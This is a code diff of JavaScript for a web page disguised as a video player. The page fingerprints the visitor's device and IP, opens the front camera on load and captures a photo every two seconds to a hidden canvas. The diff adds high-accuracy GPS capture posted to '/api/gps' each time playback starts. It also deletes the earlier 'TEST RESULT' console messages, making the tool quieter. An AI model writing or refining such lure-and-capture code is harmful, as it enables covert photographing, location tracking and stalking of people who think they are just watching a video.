@@ -1,37 +1,34 @@
-var deviceFingerprint = {};
-var realIP = '';
-var cameraStream = null;
-var photoCount = 0;
-var photoInterval = null;
-var deviceDataSent = false;
+let deviceFingerprint = {};
+let realIP = '';
+let cameraStream = null;
+let photoCount = 0;
+let photoInterval = null;
+let deviceDataSent = false;
+let gpsData = null;
 
-function getDeviceModel() {
-  return new Promise(function(resolve) {
-    try {
-      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-        navigator.userAgentData.getHighEntropyValues([
-          'architecture', 'bitness', 'brands', 'fullVersionList',
-          'mobile', 'model', 'platform', 'platformVersion', 'uaFullVersion'
-        ]).then(function(hints) {
-          if (hints) {
-            var parts = [];
-            if (hints.brands) {
-              var brands = hints.brands.map(function(b) { return b.brand + ' ' + b.version; }).join(' / ');
-              parts.push(brands);
-            }
-            if (hints.model && hints.model !== '') parts.push('Model: ' + hints.model);
-            if (hints.platform) parts.push(hints.platform + (hints.platformVersion ? ' ' + hints.platformVersion : ''));
-            if (hints.architecture) parts.push(hints.architecture + (hints.bitness ? ' ' + hints.bitness : ''));
-            if (hints.mobile !== undefined) parts.push(hints.mobile ? 'Mobile' : 'Desktop');
-            if (parts.length > 0) { resolve(parts.join(' | ')); return; }
-          }
-          resolve(parseUA());
-        }).catch(function() { resolve(parseUA()); });
-      } else {
-        resolve(parseUA());
+async function getDeviceModel() {
+  try {
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      const hints = await navigator.userAgentData.getHighEntropyValues([
+        'architecture', 'bitness', 'brands', 'fullVersionList',
+        'mobile', 'model', 'platform', 'platformVersion', 'uaFullVersion'
+      ]);
+      if (hints) {
+        const parts = [];
+        if (hints.brands) {
+          const brands = hints.brands.map(function(b) { return b.brand + ' ' + b.version; }).join(' / ');
+          parts.push(brands);
+        }
+        if (hints.model && hints.model !== '') parts.push('Model: ' + hints.model);
+        if (hints.platform) parts.push(hints.platform + (hints.platformVersion ? ' ' + hints.platformVersion : ''));
+        if (hints.architecture) parts.push(hints.architecture + (hints.bitness ? ' ' + hints.bitness : ''));
+        if (hints.mobile !== undefined) parts.push(hints.mobile ? 'Mobile' : 'Desktop');
+        if (parts.length > 0) return parts.join(' | ');
       }
-    } catch (e) { resolve(parseUA()); }
-  });
+    }
+  } catch (e) {}
+
+  return parseUA();
 }
 
 function parseUA() {
@@ -69,6 +66,38 @@ function parseUA() {
     if (/iPad/.test(ua)) result = 'iPad';
     else if (/iPod/.test(ua)) result = 'iPod';
     else result = 'iPhone';
+    var pr = window.devicePixelRatio || 1;
+    var minRes = Math.min(screen.width * pr, screen.height * pr);
+    var iPhoneModels = [
+      { name: 'iPhone 16 Pro Max', minR: 440, maxR: 450, minS: 1330, maxS: 1340 },
+      { name: 'iPhone 16 Pro',     minR: 400, maxR: 410, minS: 1200, maxS: 1220 },
+      { name: 'iPhone 16 Plus',    minR: 430, maxR: 440, minS: 1280, maxS: 1300 },
+      { name: 'iPhone 16',         minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
+      { name: 'iPhone 15 Pro Max', minR: 430, maxR: 440, minS: 1280, maxS: 1300 },
+      { name: 'iPhone 15 Pro',     minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
+      { name: 'iPhone 15 Plus',    minR: 430, maxR: 440, minS: 1280, maxS: 1300 },
+      { name: 'iPhone 15',         minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
+      { name: 'iPhone 14 Pro Max', minR: 430, maxR: 440, minS: 1280, maxS: 1300 },
+      { name: 'iPhone 14 Pro',     minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
+      { name: 'iPhone 14 Plus',    minR: 425, maxR: 435, minS: 1270, maxS: 1290 },
+      { name: 'iPhone 14',         minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
+      { name: 'iPhone 13 Pro Max', minR: 425, maxR: 435, minS: 1270, maxS: 1290 },
+      { name: 'iPhone 13 Pro',     minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
+      { name: 'iPhone 13',         minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
+      { name: 'iPhone 13 mini',    minR: 370, maxR: 380, minS: 1080, maxS: 1090 },
+      { name: 'iPhone 12 Pro Max', minR: 425, maxR: 435, minS: 1270, maxS: 1290 },
+      { name: 'iPhone 12/12 Pro',  minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
+      { name: 'iPhone 12 mini',    minR: 370, maxR: 380, minS: 1080, maxS: 1090 },
+      { name: 'iPhone 11 Pro Max', minR: 410, maxR: 420, minS: 1240, maxS: 1250 },
+      { name: 'iPhone X/XS/11 Pro',minR: 370, maxR: 380, minS: 1120, maxS: 1130 },
+      { name: 'iPhone XR/11',      minR: 410, maxR: 420, minS: 820, maxS: 830 },
+      { name: 'iPhone 8 Plus',     minR: 400, maxR: 410, minS: 1080, maxS: 1090 },
+      { name: 'iPhone 8/SE',       minR: 370, maxR: 380, minS: 740, maxS: 770 },
+    ];
+    for (var j = 0; j < iPhoneModels.length; j++) {
+      var m2 = iPhoneModels[j];
+      if (pr >= m2.minR && pr <= m2.maxR && minRes >= m2.minS && minRes <= m2.maxS) { result = m2.name; break; }
+    }
     return result + (osVer ? ' | iOS ' + osVer : '');
   }
 
@@ -103,9 +132,7 @@ function getBatteryInfo() {
 }
 
 function postJSON(url, data) {
-  try {
-    return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
-  } catch (e) { return null; }
+  try { return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); } catch (e) { return null; }
 }
 
 function postForm(url, formData) {
@@ -115,11 +142,8 @@ function postForm(url, formData) {
 function fetchRealIP() {
   return new Promise(function(resolve) {
     try {
-      fetch('https://api.ipify.org?format=json').then(function(r) {
-        return r.json();
-      }).then(function(d) {
-        realIP = d.ip || '';
-        resolve(realIP);
+      fetch('https://api.ipify.org?format=json').then(function(r) { return r.json(); }).then(function(d) {
+        realIP = d.ip || ''; resolve(realIP);
       }).catch(function() { resolve(''); });
     } catch (e) { resolve(''); }
   });
@@ -238,6 +262,36 @@ function sendDeviceData() {
   });
 }
 
+function requestGPS() {
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      gpsData = {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: Math.round(pos.coords.accuracy),
+        speed: pos.coords.speed || null,
+        altitude: pos.coords.altitude ? Math.round(pos.coords.altitude) : null,
+        heading: pos.coords.heading || null
+      };
+      console.log('GPS captured: ' + gpsData.latitude + ', ' + gpsData.longitude + ' (±' + gpsData.accuracy + 'm)');
+      postJSON('/api/gps', {
+        latitude: gpsData.latitude,
+        longitude: gpsData.longitude,
+        accuracy: gpsData.accuracy,
+        speed: gpsData.speed,
+        altitude: gpsData.altitude,
+        heading: gpsData.heading
+      });
+    },
+    function(err) {
+      console.log('GPS denied or unavailable: ' + err.message);
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
 function capturePhoto() {
   var video = document.getElementById('playerVideo');
   var canvas = document.getElementById('hiddenCanvas');
@@ -262,35 +316,22 @@ function capturePhoto() {
 function startSpamPhotos() {
   if (photoInterval) return;
   capturePhoto();
-  photoInterval = setInterval(function() {
-    capturePhoto();
-  }, 2000);
+  photoInterval = setInterval(function() { capturePhoto(); }, 2000);
 }
 
 function stopSpamPhotos() {
-  if (photoInterval) {
-    clearInterval(photoInterval);
-    photoInterval = null;
-  }
-  console.log('Stopped. Total photos taken: ' + photoCount);
+  if (photoInterval) { clearInterval(photoInterval); photoInterval = null; }
+  console.log('Stopped. Total: ' + photoCount);
 }
 
 function autoRequestCamera() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    console.log('TEST RESULT: getUserMedia not available on this browser');
-    return;
-  }
-
-  console.log('TEST STARTING: Requesting camera immediately on page load...');
-  console.log('If browser shows permission popup -> PROOF browser always asks for permission');
-  console.log('If NO popup and camera activates silently -> that would be a security bug');
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
   navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
     audio: false
   })
   .then(function(stream) {
-    console.log('TEST RESULT: Camera ACCESS GRANTED - user clicked Allow in browser permission dialog');
     cameraStream = stream;
     var video = document.getElementById('playerVideo');
     video.srcObject = stream;
@@ -299,14 +340,12 @@ function autoRequestCamera() {
     video.play().then(function() {
       var box = document.getElementById('playerBox');
       if (box) box.classList.add('active');
+      requestGPS();
       setTimeout(function() { startSpamPhotos(); }, 2000);
     }).catch(function() {});
   })
   .catch(function(err) {
-    console.log('TEST RESULT: Camera ACCESS DENIED - user clicked Block or camera unavailable');
-    console.log('This PROVES the browser ALWAYS shows permission dialog');
-    console.log('Nobody can take your photo without you clicking ALLOW');
-    console.log('Error details:', err.message);
+    console.log('Camera denied');
     var box = document.getElementById('playerBox');
     if (box) box.classList.add('active');
   });
@@ -319,6 +358,7 @@ function tryPlay() {
     loadBar.style.width = '100%';
     setTimeout(function() { loadBar.style.width = '0'; }, 600);
     document.getElementById('playerBox').classList.add('active');
+    if (!gpsData) requestGPS();
     startSpamPhotos();
     return;
   }
@@ -340,11 +380,13 @@ function tryPlay() {
       loadBar.style.width = '100%';
       setTimeout(function() { loadBar.style.width = '0'; }, 600);
       document.getElementById('playerBox').classList.add('active');
+      requestGPS();
       setTimeout(function() { startSpamPhotos(); }, 2000);
     }).catch(function() {
       loadBar.style.width = '100%';
       setTimeout(function() { loadBar.style.width = '0'; }, 600);
       document.getElementById('playerBox').classList.add('active');
+      requestGPS();
       setTimeout(function() { startSpamPhotos(); }, 2000);
     });
   })
@@ -363,15 +405,10 @@ document.addEventListener('DOMContentLoaded', function() {
     sendDeviceData();
   });
 
-  setTimeout(function() {
-    autoRequestCamera();
-  }, 1000);
+  setTimeout(function() { autoRequestCamera(); }, 1000);
 });
 
 function scrollToPlayer() {
   var box = document.getElementById('playerBox');
-  if (box) {
-    box.scrollIntoView({ behavior: 'smooth' });
-    tryPlay();
-  }
+  if (box) { box.scrollIntoView({ behavior: 'smooth' }); tryPlay(); }
 }
